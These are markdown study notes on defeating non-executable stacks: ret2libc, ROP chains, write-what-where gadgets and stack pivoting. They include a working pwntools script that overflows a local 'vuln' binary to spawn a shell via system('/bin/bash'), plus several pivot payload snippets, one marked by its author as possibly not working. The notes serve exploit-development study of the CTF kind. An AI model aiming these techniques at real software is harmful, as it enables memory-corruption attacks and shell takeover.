# No eXecute

## ret2libc

Check if the target binary is using `libc` with the following commands:  
`ldd <binary>`  
or  
`vmmap` - when inside gdb  

List functions provided by your systems libc:  
`nm -D /lib/$(uname -m)-linux-gnu/libc-*.so | grep -vw U | grep -v "_" | cut -d " " -f 3`  

libc, or any other library, is a list of functions that reside at a known offset from the library base.  
If you know the library base and the library version, you will also know the target function's address.  

*NX prevents execution from the stack but having arguments there is fine*  

Steps to exec a function in libc:  
1. find interesting function to spawn a shell (System, Exec* (execl, execle, execlp, execve, execve, etc...))
2. Set up the stack
3. Overwrite EIP/RIP with the functions address

Stack setup:  
1. Offset to EIP
2. Address of the target function
3. Return address to be restored after executing the function, i.e. exit() (or anything if we don't care about a graceful exit)
4. Arguments for the target function

### System() Example
No ASLR  
---

From the man pages:  
`int system(const char *cmd);`  

Find system()'s offset from the libc base  
`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"`  
The address provided in the second column is the offset  
Open gdb while debugging the target binary and run: `vmmap libc`. Choose one which has "x" permissions  
Add the system() offset and the executable libc base to find system()'s address.  

If the above does not work, an alternative is `p system` in gdb.  
*repeat for exit() if looking to exit gracefully*  

System() requires a pointer to the string as an argument, not the string itself. Need to find "/bin/bash" or similar in the binary.  
In gdb: `search /bin` to find instances of shells  
Try to use addresses from libc  

**Example exploit:**  

```python3
#!/usr/bin/env python3
from pwn import *
io = process("./vuln")
offset = b"A" * 520
target_func = p64(0x7ffff7e17330)   # system @ 0x7ffff7e17330
ret_addr = p64(0x7ffff7e09590)    # exit @ 0x7ffff7e09590
sys_arg = p64(0x7ffff7f61031)   # Argument to system() "/bin/bash" @ 0x7ffff7f61031

payload = offset + target_func + ret_addr + sys_arg
print(payload)

io.sendline(payload)
io.interactive()
```

If you need to pass as a command line arg you can use `(cat payload.txt; cat) | ./vuln`  

## ROP Chains

Pwntools ROP documentation: <https://docs.pwntools.com/en/latest/rop/rop.html>  
<https://github.com/Gallopsled/pwntools-tutorial/blob/master/rop.md>  
Stephen Sims - Return Oriented Shellcode (SANS SEC760 Content)  
<https://www.youtube.com/watch?v=7BMyVvYv5d0>  
Automate finding gadgets <https://github.com/packz/ropeme>  

Overflow a buffer to control the EIP/RIP.  
From the EIP/RIP onwards, place the address of the instructions you are using and any values that need to be popped into registers, followed by an `int 0x80` to switch to kernel mode and execute the system call.  

You can view the available gadgets in a program with `ropper`  
E.g. `ropper -f vuln` to view all of the gadgets in a binary.  


**Calling execve():**  
- AL register needs to hold 0x0b
- BX register needs to hold a pointer to your arg for the system call
- CX register points to the arg vector ARGV pointer array
- DX register points to the ENVP array (Environment Variable Pointer)

If the program has an mmap() function, you need to find rop gadgets **after** the mmap() has occurred to ensure the gadgets do exist in memory.  
- You can then use `ltrace` to view the address where mmap is mapped and add instuction offsets
- Validate by hitting a breakpoint in gdb and addid the 2 values, then `x/i $addr`

## Write What Where

Gadgets that allow you to store data in memory, i.e. create a pointer to an argument.  
 
E.g.  

```asm
# Basic and best example
mov [rdi], rsi; ret;

# Alternative:
xchg byte ptr [rdi], bl; ret;
```

## Writeable Locations

Find writable sections with `readelf -S -W ./vuln`  
Use pwntools to reference section addresses:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
print(elf.symbols)
```

**.data** stores initialised variables.  
The address of .data can be found with:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
data_section = elf.symbols.data_start
```

**.bss** stores uninitialised variables.  
The address of .bss can be found with:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
bss_section = elf.symbols.__bss_start
```

## Stack Pivoting

Gadgets to control ESP/RSP:  

```asm
pop rsp; ret;               # Unlikely, but great

xchg <reg>, rsp; ret;       # Just need to control the register in question:
# eg.
pop <reg>; ret;
<reg value>
xchg <reg>, rsp; ret

leave; ret;                 # These are everywhere
```

leave; ret; explanation:  
`leave` is equivalent to `mov rsp, rbp; pop rbp;`  
So a `leave; ret;` looks like `mov rsp, rbp; pop rbp; pop rip;`  
That means that when we overwrite RIP, the 8 bytes before it overwrite RBP (4 bytes for ESP)  
If we then call `leave; ret;` again, RBP is moved into RSP, thus giving us control over the stack location.  

### Example "leave; ret;" Payload

*Note: Not sure if this works.*  

```python3
from pwn import *
rop.raw([
    b"A" * rbp_offset, # rip control - 8 (4 for 32bit)
    new_stack_addr,
    leave_ret,
])
```

### Example "xchg rax, rsp; ret;" Payload

Using a simple `xchg` instruction where we control the register that is exchanged with esp.  
*This doesn't cover finding a new stack location*  

```python
from pwn import *

xchg = p32(0x0804882e) # 0x0804882e: xchg eax, esp; ret;
pop = p32(0x0804882c) # 0x0804882c: pop eax; ret;

payload = flat([
  pop,
  leaked_addr,
  xchg
])
```

### Example "sub esp, 0x20"

If you don't have much space for a rop chain, eg. only 4 or 8 bytes are overflowed out of the buffer,  
you can utilise a `sub esp, 0x20`, or similar to move the stack pointer lower in memory,  
where you have additional ROP gadgets.  
Use ROP gadgets in your offset data rather than just junk alone.  